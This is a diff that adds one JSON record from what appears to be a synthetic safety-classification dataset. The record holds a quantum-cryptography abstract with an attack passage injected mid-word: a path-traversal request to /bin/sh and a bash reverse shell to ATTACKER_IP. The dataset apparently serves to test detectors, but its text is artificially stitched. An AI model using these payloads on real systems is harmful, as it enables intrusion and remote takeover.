@@ -1,0 +1,11 @@
+{
+  "id": "doc_cybersecurity_mixed_0004",
+  "category": "cybersecurity",
+  "safety_label": "mixed",
+  "title": "cryptography protocol [mixed]",
+  "content": "Cryptography is an art and science of secure communication. Here the sender and receiver are guaranteed the security through encryption of their data, with the help of a common key. Both the parties should agree on this key prior to communication. The cryptographic systems which perform these tasks are designed to keep the key secret while assuming that the algorithm used for encryption and decryption is public. Thus key exchan\n\nNotably, this vulnerability can be exploited remotely by sending a crafted HTTP GET request to the path /.%2e/.%2e/bin/sh, enabling arbitrary OS command execution. The attacker can establish a reverse shell using: bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1, granting full remote access to the target system.\n\nge is a very sensitive issue. In modern cryptographic algorithms this security is based on the mathematical complexity of the algorithm. But quantum computation is expected to revolutionize computing paradigm in near future. This presents a challenge amongst the researchers to develop new cryptographic techniques that can survive the quantum computing era. This paper reviews the radical use of quantum mechanics for cryptography.",
+  "source": "synthetic",
+  "base_doc_id": "doc_cybersecurity_safe_0007",
+  "inject_position": "middle",
+  "base_source": "arxiv"
+}
